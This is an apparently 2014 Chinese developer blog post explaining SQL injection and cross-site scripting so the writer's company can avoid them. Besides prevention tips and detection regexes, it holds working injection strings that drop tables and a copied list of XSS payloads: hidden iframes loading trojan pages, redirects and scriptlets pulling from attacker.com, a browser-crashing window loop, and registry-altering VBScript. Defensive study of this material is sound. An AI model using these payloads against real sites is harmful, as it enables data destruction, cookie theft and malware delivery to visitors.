---
title: 网络安全
date: 2014-11-11 17:12:28 +0800
tags: web 
- a
- b
---

网络安全

* toc 
{:toc}


> 公司要以网络形式提供一系列的对外接口，而这些接口难免会有网络安全的问题。此处列出一些常见的网络攻击方式，知道原理，在代码中就避免潜在的网络安全问题。

## SQL 注入攻击

### 产生攻击的原因
参考[SQL注入攻击的方法有哪些](http://jingyan.baidu.com/article/37bce2becf7ae31002f3a293.html){:target="_blank"}


**1. 没有正确过滤转义字符**

 在用户的输入没有为转义字符过滤时，就会发生这种形式的注入式攻击，它会被传递给一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。比方说，下面的这行代码就会演示这种漏洞：

    statement := "SELECT* FROM users WHERE name = '" + userName + "';"
    
这种代码的设计目的是将一个特定的用户从其用户表中取出，但是，如果用户名被一个恶意的用户用一种特定的方式伪造，这个语句所执行的操作可能就不仅仅是代码的作者所期望的那样了。例如，将用户名变量(即username)设置为：
`a' or 't'='t`，此时原始语句发生了变化：

    SELECT * FROM users WHERE name = 'a' OR 't'='t';

如果这种代码被用于一个认证过程，那么这个例子就能够强迫选择一个合法的用户名，因为赋值't'='t'永远是正确的。


在一些SQL服务器上，如在SQL　Server中，任何一个SQL命令都可以通过这种方法被注入，包括执行多个语句。下面语句中的username的值将会导致删除“users”表，又可以从“data”表中选择所有的数据(实际上就是透露了每一个用户的信息)。

    a';DROP TABLE users; SELECT * FROM data WHERE name LIKE '%

这就将最终的SQL语句变成下面这个样子：

    SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT *
    FROM DATA WHERE name LIKE '%';

其它的SQL执行不会将执行同样查询中的多个命令作为一项安全措施。这会防止攻击者注入完全独立的查询，不过却不会阻止攻击者修改查询。

  

**2. Incorrect type handling**

如果一个用户提供的字段并非一个强类型，或者没有实施类型强制，就会发生这种形式的攻击。当在一个SQL语句中使用一个数字字段时，如果程序员没有检查用户输入的合法性(是否为数字型)就会发生这种攻击。例如：

    statement := "SELECT * FROM data WHERE id = " + a_variable + ";"

　　从这个语句可以看出，作者希望a_variable是一个与“id”字段有关的数字。不过，如果终端用户选择一个字符串，就绕过了对转义字符的需要。例如，将a_variable设置为:`1;DROP TABLE users`，它会将“users”表从数据库中删除，SQL语句变成：

    SELECT * FROM DATA WHERE id = 1;DROP TABLE users;

    
    
**3. 数据库服务器中的漏洞**

有时，数据库服务器软件中也存在着漏洞，如MYSQL服务器中`mysql_real_escape_string()`函数漏洞。这种漏洞允许一个攻击者根据错误的统一字符编码执行一次成功的SQL注入式攻击。

**4. 盲目SQL注入式攻击**

  当一个Web应用程序易于遭受攻击而其结果对攻击者却不见时，就会发生所谓的盲目SQL注入式攻击。有漏洞的网页可能并不会显示数据，而是根据注入到合法语句中的逻辑语句的结果显示不同的内容。这种攻击相当耗时，因为必须为每一个获得的字节而精心构造一个新的语句。但是一旦漏洞的位置和目标信息的位置被确立以后，一种称为Absinthe的工具就可以使这种攻击自动化。

**5. 条件响应**

注意，有一种SQL注入迫使数据库在一个普通的应用程序屏幕上计算一个逻辑语句的值：

    SELECT booktitle FROM booklist WHERE bookId = 'OOk14cd' AND 1=1

这会导致一个标准的面面，而语句

    SELECT booktitle FROM booklist WHERE bookId = 'OOk14cd' AND 1=2

在页面易于受到SQL注入式攻击时，它有可能给出一个不同的结果。如此这般的一次注入将会证明盲目的SQL注入是可能的，它会使攻击者根据另外一个表中的某字段内容设计可以评判真伪的语句。

**6. 条件性差错**

如果WHERE语句为真，这种类型的盲目SQL注入会迫使数据库评判一个引起错误的语句，从而导致一个SQL错误。例如：

    SELECT 1/0 FROM users WHERE username='Ralph'

显然，如果用户Ralph存在的话，被零除将导致错误。

**7. 时间延误**

　　时间延误是一种盲目的SQL注入，根据所注入的逻辑，它可以导致SQL引擎执行一个长队列或者是一个时间延误语句。攻击者可以衡量页面加载的时间，从而决定所注入的语句是否为真。


### 预防
针对sql注入的方式，就应该有相应的预防措施。有网友已经列出一些预防措施，[http://www.iteye.com/topic/617072](http://www.iteye.com/topic/617072){:target="_blank"}

**1.PreparedStatement**  
这个方法是对Java这门语言而言的，始终以PreparedStatement代替Statement。

**2.正则表达式** 

    2.1、检测SQL meta-characters的正则表达式 `/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix`  
    2.2、修正检测SQL meta-characters的正则表达式 
        `/((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-) |(\%3B)|(:))/i`  
    2.3、典型的 SQL 注入攻击的正则表达式 `/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\ ))/ix`  ' 
    2.4、检测SQL注入，UNION查询关键字的正则表达式 `/((\%27)|(\'))union/ix(\%27)|(\')`
        - 单引号和它的hex等值　　union - union关键字。  
    2.5、检测MS SQL Server SQL注入攻击的正则表达式 `/exec(\s|\+)+(s|x)p\w+/ix`  
    
**3.字符串过滤** 

**4.屏蔽不安全符号**  
 如检查是否含有"'","\\","/"


##跨站脚本攻击

跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。

###原理

此处使用现有的例子，参考[跨站脚本攻击XSS解析及防御](http://www.2cto.com/Article/201310/254010.html){:target="_blank"}

假设有个留言板：

    <!DOCTYPE html>
    <html>
    <head>
    <?php include('/components/headerinclude.php');?></head>
    <style type="text/css">
        .comment-title{
            font-size:14px;
            margin: 6px 0px 2px 4px;
        }
 
        .comment-body{
            font-size: 14px;
            color:#ccc;
            font-style: italic;
            border-bottom: dashed 1px #ccc;
            margin: 4px;
        }
    </style>
        <script type="text/javascript" src="/js/cookies.js"></script>
    <body>
    <form method="post" action="list.php">
        <div style="margin:20px;">
            <div style="font-size:16px;font-weight:bold;">Your Comment</div>
            <div style="padding:6px;">
                Nick Name:
                <br/>
                <input name="name" type="text" style="width:300px;"/>
            </div>
            <div style="padding:6px;">
                Comment:
                <br/>
                <textarea name="comment" style="height:100px; width:300px;"></textarea>
            </div>
            <div style="padding-left:230px;">
                <input type="submit" value="POST" style="padding:4px 0px; width:80px;"/>
            </div>
            <div style="border-bottom:solid 1px #fff;margin-top:10px;">
                <div style="font-size:16px;font-weight:bold;">Comments</div>
            </div>
            <?php 
                require('/components/comments.php'); 
                if(!empty($_POST['name'])){
                    addElement($_POST['name'],$_POST['comment']);
                }
                renderComments();
            ?>
        </div>
    </form>
    </body>
    </html>

可以显示如下的结果

![xss_first](../../images/2014/xss_test.jpg)

如有攻击者提交的Comment为类似如下的评论

    <stript type="text/javascript"> 
        console.log("FUCK U"); 
    </script>
    
则之后每次提交评论时，页面控制台都会输出 “FUCK U”



### XSS常用攻击脚本

直接复用网上资料[XSS常用攻击脚本](http://www.jb51.net/hack/39734.html){:target="_blank"}


1、这个应该都知道，常用于测试 是否存在跨站  
    
    <script>alert("test")</script>  

2、代码将会弹出壹个包含有浏览者cookie信息的对话框，如果用户已经通过帐号登陆网站，在显示的cookie信息中将会包含有用户的账户名和密码。 

    <script>window.alert(document.cookie);</script> 
     
3、 当用户浏览该 页时，将弹出壹个高爲200，宽爲200的网页窗口，在其中打开的页面是http://www.pete.cn/default.asp 

    <script>window.open('http://www.pete.cn /default.asp','newwindow','width=200,height=200');</script>,

4、跨站攻击的形式是多样的，不仅可以在网页中插入跨站脚本代码，而且可以在flash文件中插入跨站脚本代码，实现跨站攻击。
由于flash文件有较高 的安全性，用户通常对flash文件的警惕性不够，因此用flash文件进行跨站攻击的成功率很高。
如果将这个含有跨站脚本代码的flash文件插入到网 页中，例如制作成网页banner或者广告，那么中招的用户将更多。 
flash跨站是通过在flash文件中插入动作脚本来实现的，通过在flash文件“帧”的“动作”中插入跨站脚本代码来实现跨站攻击，其实现方法入下： 
首先运行flash文件制作工具flash8.exe，新建壹个空白的flash文档。然后选中其中的第壹帧，进入界面下方的“动作”编辑界面，在Action Script中插入我们的跨站脚本代码 

    getURL("http://网页木马地址", "_blank", "GET"); 
    loadMovieNum("http://www.pete.cn/test.swf", 0); 

5、这就是 传说中的框架 - - 膜拜吧 还有JS 也可以使用，比框架更隐蔽 

    <iframe src=http://www.***.com/muma.htm width=0 height=0>< iframe> 

6、Refresh到另壹个页面： 

    <meta http-equiv="refresh" content="1;URL=http://www.attacker.com/another.htm"> 

7、scriptlet引入另壹个页面：
 
    <object type="text/x-scriptlet" data="http://www.attacker.com/import.htm"></object> 

 
8、打开无数个浏览器窗口，直至CPU超负荷，非关机不可：
 
    <script language="JavaScript"> 
    <!-- 
    while (true) 
    { 
    window.open("URI"); //如果URI就是当前页本身，那就更具破坏性。 
    } 
    //--> 
    </script> 
        
9、 修改注册表（IE 主页）

    <script language="VBScript"> 
    Set RegWsh = CreateObject("WScript.Shell") 
    RegWsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.attacker.com" 
    </script> 
    
有时候，</script> 可以替换大小写 来躲过过滤





###预防

看看微软给出的建议

.验证输入  
.编码输出  
.设置正确的字符编码  
.使用 validateRequest 选项  
.在 Web 服务器中安装 URLScan  
.使用 HttpOnly cookie 选项   
.使用 <frame> 安全属性  
.使用 innerText 属性  
 
